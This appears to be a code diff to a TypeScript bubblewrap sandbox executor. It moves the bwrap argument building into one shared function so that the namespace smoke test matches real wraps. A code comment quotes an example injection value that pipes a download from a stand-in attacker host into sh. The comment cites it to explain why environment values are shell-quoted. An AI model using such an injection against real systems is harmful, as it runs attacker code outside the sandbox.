@@ -57,35 +57,115 @@ function resolveBwrapBinary(): string {
  */
 const TMPFS_SIZE_BYTES = 524288000; // 500 * 1024 * 1024
 
+/** Shell-quote a value for the shell STRING returned by `wrapCommand`. */
+function shellQuote(s: string): string {
+	return `'${shellEscape(s)}'`;
+}
+
+/** Inputs of {@link buildBwrapArgs}: everything a wrap varies by. */
+interface BwrapArgsInput {
+	/**
+	 * Quotes each interpolated value: shell quoting for the shell string
+	 * `wrapCommand` returns, identity for an argv passed straight to spawn.
+	 */
+	quote: (value: string) => string;
+	/** Directory mounted as the size-capped tmpfs. */
+	temp: string;
+	/** Absolute paths bound read-only BEFORE the writable scopes. */
+	readonlyRoots: readonly string[];
+	/** Paths bound read-write. */
+	scopes: readonly string[];
+	/** Already-built `--setenv` / `--unsetenv` arguments. */
+	envArgs: readonly string[];
+	networkMode: SandboxPolicyOptions['network_mode'] | undefined;
+	/** The shell command run as `bash -c <command>`. */
+	command: string;
+}
+
 /**
- * Arguments for the namespace smoke test: the smallest sandbox that needs the
- * same kernel features as a real wrap (user, IPC and PID namespaces, a new
- * session, dropped capabilities, `/proc` and `/dev` mounts), then `true`.
- * `--unshare-net` is left out because the real wrap adds it only when the
- * policy's network mode is off. `bwrap --version` succeeds even where bwrap
- * cannot create a namespace at all — Ubuntu 24.04+ restricts unprivileged
- * user namespaces (`kernel.apparmor_restrict_unprivileged_userns = 1`) and
- * every real invocation fails with "setting up uid map: Permission denied";
- * unprivileged containers can allow the user namespace but refuse `--proc`.
- * Availability must therefore be proven by running one.
+ * The bwrap argument list of a wrap — the single source of truth for both
+ * `wrapCommand` and the namespace smoke test, so the smoke test can never
+ * exercise fewer kernel features or mounts than a real wrap needs.
  */
-export const BWRAP_NAMESPACE_SMOKE_ARGS: readonly string[] = [
-	'--unshare-user',
-	'--unshare-ipc',
-	'--unshare-pid',
-	'--die-with-parent',
-	'--new-session',
-	'--cap-drop',
-	'ALL',
-	'--ro-bind',
-	'/',
-	'/',
-	'--dev',
-	'/dev',
-	'--proc',
-	'/proc',
-	'true',
-];
+function buildBwrapArgs(input: BwrapArgsInput): string[] {
+	const { quote } = input;
+	// Read-only roots (the session workspace) go BEFORE the writable scope
+	// binds: bwrap mounts in argument order, so the scope paths are mounted
+	// on top and stay writable while everything else in the root is
+	// readable but not writable.
+	const roBindArgs = input.readonlyRoots.flatMap((p) => [
+		'--ro-bind',
+		quote(p),
+		quote(p),
+	]);
+	// --bind SRC DEST for each scope path.
+	const bindArgs = input.scopes.flatMap((p) => ['--bind', quote(p), quote(p)]);
+	const args = [
+		'--unshare-user',
+		'--unshare-ipc',
+		'--die-with-parent',
+		'--new-session',
+		'--cap-drop',
+		'ALL',
+		...roBindArgs,
+		...bindArgs,
+		'--dev',
+		'/dev',
+		'--size',
+		String(TMPFS_SIZE_BYTES),
+		'--tmpfs',
+		quote(input.temp),
+		'--ro-bind',
+		'/etc',
+		'/etc',
+		'--ro-bind',
+		'/usr',
+		'/usr',
+		'--ro-bind',
+		'/lib',
+		'/lib',
+		'--ro-bind',
+		'/lib64',
+		'/lib64',
+		'--proc',
+		'/proc',
+		'--unshare-pid',
+		...input.envArgs,
+		'--',
+		'bash',
+		'-c',
+		quote(input.command),
+	];
+	if ((input.networkMode ?? 'off') === 'off') {
+		args.splice(1, 0, '--unshare-net');
+	}
+	return args;
+}
+
+/**
+ * Arguments for the namespace smoke test: a real wrap under the default
+ * policy (network off, no scopes, no read-only roots, `/tmp` tmpfs) running
+ * `true`, built by the same {@link buildBwrapArgs} as `wrapCommand`. It thus
+ * needs every kernel feature and mount a real wrap needs (user, network, IPC
+ * and PID namespaces, a new session, dropped capabilities, `/proc`, `/dev`,
+ * a sized tmpfs, the `/etc` `/usr` `/lib` `/lib64` binds, and `bash`).
+ * `bwrap --version` succeeds even where bwrap cannot create a namespace at
+ * all — Ubuntu 24.04+ restricts unprivileged user namespaces
+ * (`kernel.apparmor_restrict_unprivileged_userns = 1`) and every real
+ * invocation fails with "setting up uid map: Permission denied"; unprivileged
+ * containers can allow the user namespace but refuse `--proc`; a host
+ * without `/lib64` fails the bind. Availability must therefore be proven by
+ * running one.
+ */
+export const BWRAP_NAMESPACE_SMOKE_ARGS: readonly string[] = buildBwrapArgs({
+	quote: (value) => value,
+	temp: '/tmp',
+	readonlyRoots: [],
+	scopes: [],
+	envArgs: [],
+	networkMode: 'off',
+	command: 'true',
+});
 
 /** Run the namespace smoke test; never throws. */
 function probeBwrapNamespace(
@@ -298,12 +378,8 @@ export class BubblewrapSandboxExecutor implements SandboxExecutor {
 		const temp = tempDir ?? this._tempDir ?? '/tmp';
 		const allScopes = [...this._scopePaths, ...scopePaths];
 
-		// Read-only roots (the session workspace) go BEFORE the writable scope
-		// binds: bwrap mounts in argument order, so the scope paths are mounted
-		// on top and stay writable while everything else in the root is
-		// readable but not writable. Only absolute paths are accepted; a
-		// relative or empty entry is dropped rather than mounted somewhere
-		// unintended.
+		// Only absolute read-only roots are accepted; a relative or empty
+		// entry is dropped rather than mounted somewhere unintended.
 		const readonlyRoots = [
 			...new Set(
 				(policy?.readonly_roots ?? []).filter(
@@ -311,19 +387,6 @@ export class BubblewrapSandboxExecutor implements SandboxExecutor {
 				),
 			),
 		];
-		const roBindArgs = readonlyRoots.flatMap((p) => [
-			'--ro-bind',
-			`'${shellEscape(p)}'`,
-			`'${shellEscape(p)}'`,
-		]);
-
-		// Build --bind arguments for each scope path (SRC DEST pair for bwrap)
-		// Shell-escape and single-quote wrap each path to handle spaces and special chars
-		const bindArgs = allScopes.flatMap((p) => [
-			'--bind',
-			`'${shellEscape(p)}'`,
-			`'${shellEscape(p)}'`,
-		]);
 
 		// Build env override arguments for bwrap
 		// --setenv KEY=VALUE for string values (two separate args), --unsetenv KEY for null values.
@@ -352,51 +415,20 @@ export class BubblewrapSandboxExecutor implements SandboxExecutor {
 					// `'; curl attacker.tld | sh; echo '` would execute OUTSIDE the
 					// sandbox. `key` needs no quoting: `isValidEnvKey` constrains it
 					// to /^[a-zA-Z_][a-zA-Z0-9_]*$/, which is shell-inert.
-					envArgs.push('--setenv', key, `'${shellEscape(value)}'`);
+					envArgs.push('--setenv', key, shellQuote(value));
 				}
 			}
 		}
 
-		// Core sandbox arguments
-		const args = [
-			'--unshare-user',
-			'--unshare-ipc',
-			'--die-with-parent',
-			'--new-session',
-			'--cap-drop',
-			'ALL',
-			...roBindArgs,
-			...bindArgs,
-			'--dev',
-			'/dev',
-			'--size',
-			String(TMPFS_SIZE_BYTES),
-			'--tmpfs',
-			`'${shellEscape(temp)}'`,
-			'--ro-bind',
-			'/etc',
-			'/etc',
-			'--ro-bind',
-			'/usr',
-			'/usr',
-			'--ro-bind',
-			'/lib',
-			'/lib',
-			'--ro-bind',
-			'/lib64',
-			'/lib64',
-			'--proc',
-			'/proc',
-			'--unshare-pid',
-			...envArgs,
-			'--',
-			'bash',
-			'-c',
-			`'${shellEscape(command)}'`,
-		];
-		if ((policy?.network_mode ?? 'off') === 'off') {
-			args.splice(1, 0, '--unshare-net');
-		}
+		const args = buildBwrapArgs({
+			quote: shellQuote,
+			temp,
+			readonlyRoots,
+			scopes: allScopes,
+			envArgs,
+			networkMode: policy?.network_mode,
+			command,
+		});
 
 		const binary = _internals.resolveBwrapBinary();
 		return `${binary} ${args.join(' ')}`;
